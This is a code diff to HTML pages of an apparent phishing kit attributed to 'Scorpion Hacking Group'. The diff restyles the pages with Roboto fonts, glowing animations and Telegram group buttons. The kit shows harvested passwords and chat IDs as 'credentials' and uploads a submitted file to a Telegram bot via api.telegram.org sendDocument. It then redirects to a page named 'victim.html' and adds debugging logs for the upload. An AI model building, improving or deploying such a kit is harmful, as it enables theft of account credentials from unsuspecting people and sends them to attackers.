@@ -7,7 +7,7 @@
     <style>
         body {
             margin: 0;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Roboto', sans-serif;
             background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
             display: flex;
             justify-content: center;
@@ -95,6 +95,7 @@
             }
         }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
@@ -142,8 +143,8 @@
     <style>
         body {
             margin: 0;
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #1a1a1a, #2c2c2c);
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #121212, #1f1f1f);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -151,80 +152,136 @@
             color: #fff;
         }
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 20px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            padding: 25px;
             width: 90%;
-            max-width: 500px;
+            max-width: 550px;
             text-align: center;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            animation: fadeIn 0.5s ease-out;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            animation: pulse 2s infinite;
         }
         h1 {
-            font-size: 2rem;
-            color: #ff4d4d;
-            margin-bottom: 20px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            font-size: 2.2rem;
+            color: #ff3d3d;
+            margin-bottom: 25px;
+            text-shadow: 0 0 10px rgba(255, 61, 61, 0.5);
+            animation: glow 1.5s ease-in-out infinite alternate;
         }
         .credential {
-            background: rgba(255, 255, 255, 0.05);
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
             padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            font-size: 1.1rem;
-            transition: transform 0.3s ease;
+            margin: 12px 0;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2);
+            animation: slideUp 0.5s ease-out;
         }
         .credential:hover {
-            transform: scale(1.05);
-            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-3px);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 5px 15px rgba(255, 61, 61, 0.3);
+        }
+        .join-message {
+            margin-top: 20px;
+            font-size: 1.1rem;
+            color: #ddd;
+        }
+        .join-message a {
+            color: #ff3d3d;
+            text-decoration: none;
+            font-weight: 700;
+            transition: color 0.3s ease;
+        }
+        .join-message a:hover {
+            color: #fff;
+            text-decoration: underline;
         }
         .footer {
-            margin-top: 20px;
-            font-size: 0.9rem;
-            color: #bbb;
+            margin-top: 25px;
+            font-size: 0.95rem;
+            color: #aaa;
         }
         .footer a {
-            color: #ff4d4d;
+            color: #ff3d3d;
             text-decoration: none;
+            font-weight: 700;
             transition: color 0.3s ease;
         }
         .footer a:hover {
             color: #fff;
         }
-        .join-message {
-            margin-top: 15px;
-            font-size: 1rem;
+        .link-button {
+            display: inline-block;
+            padding: 10px 20px;
+            margin: 8px 5px;
+            border-radius: 25px;
+            background: linear-gradient(90deg, #ff3d3d, #ff6b6b);
             color: #fff;
-        }
-        .join-message a {
-            color: #ff4d4d;
             text-decoration: none;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
-        .join-message a:hover {
-            text-decoration: underline;
+        .link-button:hover {
+            background: linear-gradient(90deg, #ff6b6b, #ff3d3d);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 61, 61, 0.4);
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .link-button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: width 0.6s ease, height 0.6s ease;
+        }
+        .link-button:hover::after {
+            width: 300px;
+            height: 300px;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6); }
+            50% { box-shadow: 0 10px 50px rgba(255, 61, 61, 0.3); }
+            100% { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6); }
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 5px rgba(255, 61, 61, 0.5); }
+            to { text-shadow: 0 0 15px rgba(255, 61, 61, 0.8); }
+        }
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
         @media (max-width: 600px) {
             .container {
-                padding: 15px;
+                padding: 20px;
                 width: 95%;
             }
             h1 {
-                font-size: 1.5rem;
+                font-size: 1.8rem;
             }
             .credential {
-                font-size: 1rem;
+                font-size: 1.1rem;
             }
-            .footer, .join-message {
-                font-size: 0.8rem;
+            .join-message, .footer {
+                font-size: 0.9rem;
+            }
+            .link-button {
+                padding: 8px 15px;
+                font-size: 0.9rem;
             }
         }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
@@ -233,9 +290,9 @@
         <div class="credential">Password: ${password}</div>
         <div class="credential">Chat ID: ${chatId}</div>
         <div class="join-message">
-            Aise hi aur tools ke liye hamare group aur channel join kare:<br>
-            <a href="https://t.me/ScorpionHackingGroup" target="_blank">t.me/ScorpionHackingGroup</a><br>
-            <a href="https://t.me/ScorpionHackingGroupChat" target="_blank">t.me/ScorpionHackingGroupChat</a>
+            Join our group and chat for more exclusive tools!<br>
+            <a href="https://t.me/ScorpionHackingGroup" class="link-button" target="_blank">Scorpion Hacking Group</a>
+            <a href="https://t.me/ScorpionHackingGroupChat" class="link-button" target="_blank">Group Chat</a>
         </div>
         <div class="footer">
             Developed by <a href="https://t.me/ScorpionYug" target="_blank">Scorpion Yug</a> & Zara
@@ -249,10 +306,8 @@
         // Enforce ref parameter
         if (!validateChatId(chatId)) {
             alert('Invalid or missing ref parameter! Use ?ref=yourChatID');
-            // Optionally, hide the form if ref is invalid
             document.querySelector('.container').innerHTML = '<h1>Invalid or missing ref parameter!</h1>';
         } else {
-            // Preserve ref in URL
             history.replaceState(null, '', `?ref=${chatId}`);
 
             document.getElementById('profileForm').addEventListener('submit', async (e) => {
@@ -277,21 +332,25 @@
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('document', file);
+                    console.log('Sending HTML file to Telegram:', { chatId, fileName: file.name });
 
                     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                         method: 'POST',
                         body: formData
                     });
                     const data = await response.json();
+                    console.log('Telegram API Response:', data);
 
                     if (response.ok && data.ok) {
+                        console.log('✅ Redirecting to victim.html');
                         window.location.href = `victim.html?ref=${chatId}`;
                     } else {
+                        console.error('Telegram API Error:', data);
                         alert(`Error sending data: ${data.description || 'Failed to send file. Check bot token and chat ID.'}`);
                     }
                 } catch (error) {
-                    alert('Error sending data: Network issue or CORS blocked. Check console.');
                     console.error('Error:', error);
+                    alert('Error sending data: Network issue or CORS blocked. Check console.');
                 }
             });
         }
